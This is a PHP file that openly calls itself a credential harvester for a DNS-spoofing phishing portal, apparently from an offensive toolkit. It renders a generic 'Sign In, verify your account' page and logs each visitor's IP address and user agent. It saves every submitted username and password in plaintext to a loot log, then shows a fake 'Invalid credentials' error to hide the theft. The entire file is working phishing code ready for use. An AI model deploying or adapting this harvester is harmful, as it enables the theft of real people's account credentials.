<?php
// Simple credential harvester for DNS spoof portal.
// Writes submitted credentials to ../captures/credentials.log
// in a minimal, newline-delimited format.

// Derive site name from directory (e.g., portal) and write under captures/<site>/.
// If the RUSTYJACK_DNSSPOOF_LOOT env var is set, use it as the base.
$site_name = basename(__DIR__);
$base_override = getenv('RUSTYJACK_DNSSPOOF_LOOT');
if ($base_override && is_string($base_override) && strlen($base_override) > 0) {
    $capture_dir = rtrim($base_override, '/');
} else {
    $capture_dir = __DIR__ . '/../captures/' . $site_name;
}
if (!is_dir($capture_dir)) {
    @mkdir($capture_dir, 0755, true);
}

$capture_path = $capture_dir . '/credentials.log';

function log_creds($path, $payload) {
    $line = sprintf(
        "[%s] ip=%s ua=\"%s\" user=\"%s\" pass=\"%s\"\n",
        date('c'),
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        $payload['username'] ?? '',
        $payload['password'] ?? ''
    );
    @file_put_contents($path, $line, FILE_APPEND | LOCK_EX);
}

$visit_log = $capture_dir . '/visits.log';
function log_visit($path, $status = 'hit') {
    $line = sprintf(
        "[%s] ip=%s ua=\"%s\" uri=\"%s\" status=%s\n",
        date('c'),
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        $_SERVER['REQUEST_URI'] ?? '/',
        $status
    );
    @file_put_contents($path, $line, FILE_APPEND | LOCK_EX);
}

$message = '';
log_visit($visit_log, 'view');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    log_creds($capture_path, ['username' => $username, 'password' => $password]);
    $message = 'Invalid credentials. Please try again.';
    log_visit($visit_log, 'post');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0b1c2c; color: #e6edf5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #11263a; padding: 28px; border-radius: 8px; width: 320px; box-shadow: 0 8px 20px rgba(0,0,0,0.35); }
        h1 { margin: 0 0 12px; font-size: 20px; letter-spacing: 0.5px; }
        p { margin: 0 0 14px; color: #b8c6d8; }
        label { display: block; margin-bottom: 6px; font-weight: bold; }
        input { width: 100%; padding: 10px; margin-bottom: 12px; border: 1px solid #2b4158; border-radius: 4px; background: #0b1c2c; color: #e6edf5; }
        button { width: 100%; padding: 10px; background: #2f8cff; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        button:hover { background: #1f6fcc; }
        .msg { margin-bottom: 12px; color: #f5a623; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Sign In</h1>
        <p>Please verify your account to continue.</p>
        <?php if ($message): ?>
            <div class="msg"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        <form method="POST">
            <label for="username">Username</label>
            <input id="username" name="username" type="text" required>

            <label for="password">Password</label>
            <input id="password" name="password" type="password" required>

            <button type="submit">Continue</button>
        </form>
    </div>
</body>
</html>
